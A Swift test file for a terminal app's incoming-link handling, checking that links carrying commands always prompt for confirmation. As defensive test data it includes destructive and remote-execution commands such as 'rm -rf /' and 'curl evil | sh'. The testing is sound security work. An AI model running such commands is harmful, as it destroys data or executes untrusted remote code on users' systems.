import CoreSpotlight
import Foundation
import Testing

@testable import ApexTerminal

/// Links that ask this app to do something (D-061).
///
/// A URL arrives from anywhere — a web page, a message from a stranger, a QR code taped to
/// a wall — so these tests are as much about what the app refuses as about what it parses.
@Suite("Incoming links")
struct IncomingURLTests {
    private func parse(_ text: String) -> IncomingURL? {
        URL(string: text).flatMap(IncomingURL.init)
    }

    @Test("An ssh:// link names a server, and its parts are optional in the usual ways")
    func parsesSSHLinks() {
        #expect(parse("ssh://example.com") == .address(.init(host: "example.com")))
        #expect(parse("ssh://deploy@example.com") == .address(.init(username: "deploy", host: "example.com")))
        #expect(parse("ssh://deploy@example.com:2222")
            == .address(.init(username: "deploy", host: "example.com", port: 2222)))
        // IPv6 in brackets, as the URL syntax requires.
        #expect(parse("ssh://[2001:db8::1]:22") == .address(.init(host: "2001:db8::1", port: 22)))
    }

    @Test("A link with nothing usable in it is not this app's business")
    func ignoresIrrelevantLinks() {
        #expect(parse("https://example.com") == nil)
        #expect(parse("ssh://") == nil)
        #expect(parse("apexterminal://") == nil)
        #expect(parse("apexterminal://open") == nil, "open needs something to open")
        #expect(parse("apexterminal://run?host=web") == nil, "run needs something to run")
        #expect(parse("apexterminal://something?host=web") == nil, "an action this app has no idea about")
    }

    @Test("The app's own scheme names a saved connection, or an address")
    func parsesOwnScheme() {
        #expect(parse("apexterminal://open?host=web") == .savedConnection(reference: "web", command: nil))
        #expect(parse("apexterminal://run?host=web&command=uptime")
            == .savedConnection(reference: "web", command: "uptime"))
        #expect(parse("apexterminal://open?address=deploy@example.com:2222")
            == .address(.init(username: "deploy", host: "example.com", port: 2222)))
    }

    @Test("Blank parts are treated as absent rather than as empty strings")
    func treatsBlanksAsAbsent() {
        #expect(parse("apexterminal://run?host=web&command=%20%20") == nil, "a blank command is no command")
        #expect(parse("apexterminal://open?host=%20") == nil)
    }

    @Test("A link that carries a command is always confirmed, saved or not")
    func commandsAlwaysAsk() {
        // The rule this app cannot get wrong: a terminal that runs what a link says,
        // without asking, is remote execution with a nice icon. It does not matter that
        // the connection is one the user saved — the command came from the link.
        let saved = IncomingURL.savedConnection(reference: "web", command: "rm -rf /")
        #expect(saved.authorisation(isSaved: true) == .confirm(.runsACommand))
        #expect(saved.authorisation(isSaved: false) == .confirm(.runsACommand))

        let address = IncomingURL.address(.init(host: "example.com", command: "curl evil | sh"))
        #expect(address.authorisation(isSaved: true) == .confirm(.runsACommand))
    }

    @Test("A server this device has never been told about is confirmed")
    func unknownServersAsk() {
        let address = IncomingURL.address(.init(host: "example.com"))
        #expect(address.authorisation(isSaved: false) == .confirm(.unknownServer))
        // And a connection already saved opens, because that is what tapping a link to it
        // means and nothing is being run.
        #expect(address.authorisation(isSaved: true) == .openDirectly)
        #expect(IncomingURL.savedConnection(reference: "web", command: nil)
            .authorisation(isSaved: true) == .openDirectly)
    }
}

/// What the app does with a link, once it has one (D-061).
@Suite("Links, decided") @MainActor
struct LinkCoordinatorTests {
    private func coordinator(hosts: [Host]) -> LinkCoordinator {
        LinkCoordinator(hosts: { hosts })
    }

    private func url(_ text: String) -> URL { URL(string: text)! }

    @Test("A link to a saved connection opens it, with nothing to ask")
    func opensSavedConnections() {
        let host = Host(name: "web", hostname: "example.com", port: 22, username: "deploy")
        let links = coordinator(hosts: [host])

        links.receive(url("apexterminal://open?host=web"))
        #expect(links.pending == nil, "nothing to ask about")
        #expect(links.consumeReady() == .open(hostID: host.id))

        // And by address, which is what an `ssh://` link from a wiki looks like.
        links.receive(url("ssh://deploy@example.com:22"))
        #expect(links.consumeReady() == .open(hostID: host.id))
    }

    @Test("A link with a command is held until it is approved")
    func commandsWait() {
        let host = Host(name: "web", hostname: "example.com", port: 22, username: "deploy")
        let links = coordinator(hosts: [host])

        links.receive(url("apexterminal://run?host=web&command=uptime"))
        #expect(links.consumeReady() == nil, "nothing may happen before the answer")
        let pending = links.pending
        #expect(pending?.reason == .runsACommand)
        #expect(pending?.command == "uptime")
        #expect(pending?.existing?.id == host.id)

        links.approvePending()
        #expect(links.pending == nil)
        #expect(links.consumeReady() == .openAndRun(hostID: host.id, command: "uptime"))
    }

    @Test("Refusing a link does nothing at all")
    func refusingDoesNothing() {
        let host = Host(name: "web", hostname: "example.com", port: 22, username: "deploy")
        let links = coordinator(hosts: [host])

        links.receive(url("apexterminal://run?host=web&command=rm%20-rf%20%2F"))
        #expect(links.pending != nil)
        links.dismissPending()
        #expect(links.pending == nil)
        #expect(links.consumeReady() == nil, "a refused link must leave nothing behind")
    }

    @Test("A server the device does not have is offered, not added")
    func unknownServersAreOffered() {
        let links = coordinator(hosts: [])
        links.receive(url("ssh://deploy@new.example.com:2222"))

        #expect(links.pending?.reason == .unknownServer)
        links.approvePending()
        #expect(links.consumeReady() == .offerToAdd(
            .init(username: "deploy", host: "new.example.com", port: 2222)
        ))
    }

    @Test("A link naming a connection that has gone since it arrived does nothing")
    func vanishedConnections() {
        // The window between a link arriving and the answer is small but real: a
        // connection can be deleted in it, and acting on a stale id would be acting on
        // whatever took its place.
        let host = Host(name: "web", hostname: "example.com", port: 22, username: "deploy")
        var saved = [host]
        let links = LinkCoordinator(hosts: { saved })

        links.receive(url("apexterminal://run?host=web&command=uptime"))
        #expect(links.pending != nil)
        saved = []
        links.approvePending()
        #expect(links.consumeReady() == .openAndRun(hostID: host.id, command: "uptime"),
                "the connection it named when the question was asked is the one it means")
    }

    @Test("A link the app has nothing to do with leaves no trace")
    func ignoresOtherLinks() {
        let links = coordinator(hosts: [])
        links.receive(url("https://example.com"))
        #expect(links.pending == nil)
        #expect(links.consumeReady() == nil)
    }
}

/// Spotlight and Handoff (D-061).
@Suite("Search results and handovers") @MainActor
struct ActivityTests {
    @Test("A Spotlight result opens the connection it stands for")
    func spotlightResultsOpen() {
        let host = Host(name: "web", hostname: "example.com", port: 22, username: "deploy")
        let links = LinkCoordinator(hosts: { [host] })

        let activity = NSUserActivity(activityType: CSSearchableItemActionType)
        activity.userInfo = [CSSearchableItemActivityIdentifier: host.id.uuidString]
        links.receive(activity: activity)

        // No question: a search result is one the person picked out of their own
        // connections, and it cannot carry a command.
        #expect(links.pending == nil)
        #expect(links.consumeReady() == .open(hostID: host.id))
    }

    @Test("A handover opens the same connection on this device")
    func handoverOpens() {
        let host = Host(name: "web", hostname: "example.com", port: 22, username: "deploy")
        let links = LinkCoordinator(hosts: { [host] })
        links.receive(activity: SessionActivity.make(hostID: host.id, title: host.name))
        #expect(links.consumeReady() == .open(hostID: host.id))
    }

    @Test("A handover for a connection this device does not have opens nothing")
    func handoverForAnUnknownConnection() {
        // Sync is not available, so the other device may have connections this one does
        // not. Opening "something like it" would be a guess about which server to log in
        // to, which is the last thing to guess about.
        let links = LinkCoordinator(hosts: { [] })
        links.receive(activity: SessionActivity.make(hostID: UUID(), title: "elsewhere"))
        #expect(links.pending == nil)
        #expect(links.consumeReady() == .ignored)
    }

    @Test("The activity carries the connection's id and nothing else")
    func activityCarriesNothingSecret() {
        let id = UUID()
        let activity = SessionActivity.make(hostID: id, title: "web")
        // A user activity is stored by the system and advertised over the air. What it
        // says is which saved connection this is; the other device looks the rest up in
        // its own list.
        #expect(activity.userInfo as? [String: String] == [SessionActivity.hostKey: id.uuidString])
        #expect(activity.isEligibleForHandoff)
        #expect(!activity.isEligibleForSearch, "indexing is the Spotlight switch's business")
        #expect(!activity.isEligibleForPrediction)
    }

    @Test("What is indexed is what the row already shows")
    func indexedFieldsAreNotSecret() {
        let host = Host(name: "web", hostname: "example.com", port: 2222, username: "deploy")
        let item = SpotlightIndexer.item(for: host)
        #expect(item.uniqueIdentifier == host.id.uuidString)
        #expect(item.attributeSet.title == "web")
        #expect(item.attributeSet.contentDescription == host.subtitle)
        // Nothing about credentials, keys or host keys reaches the index.
        let indexed = [item.attributeSet.title, item.attributeSet.contentDescription]
            .compactMap { $0 }
            .joined(separator: " ")
        #expect(!indexed.lowercased().contains("password"))
        #expect(!indexed.lowercased().contains("key"))
    }
}
